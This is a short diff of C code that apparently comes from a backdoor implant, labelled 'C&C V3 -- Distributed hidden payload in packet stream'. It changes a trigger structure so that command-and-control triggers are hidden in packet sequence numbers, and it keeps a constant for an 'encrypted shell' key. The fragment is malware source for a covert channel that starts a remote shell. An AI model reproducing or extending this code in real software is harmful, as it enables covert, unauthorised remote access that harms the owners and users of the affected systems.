@@ -27,13 +27,10 @@
 
 //C&C V3 -- Distributed hidden payload in packet stream
 struct trigger_t {
-    unsigned char xor_key;
-    unsigned int ip;
-    short unsigned int port;
-    unsigned char pad1;
-    short unsigned int pad2;
-    short unsigned int crc;
+    unsigned int seq_raw;
 };
+#define CC_STREAM_TRIGGER_PAYLOAD_LEN 12
+#define CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES 4
 #define CC_STREAM_TRIGGER_KEY_ENCRYPTED_SHELL "\x2C\x82"
 
 
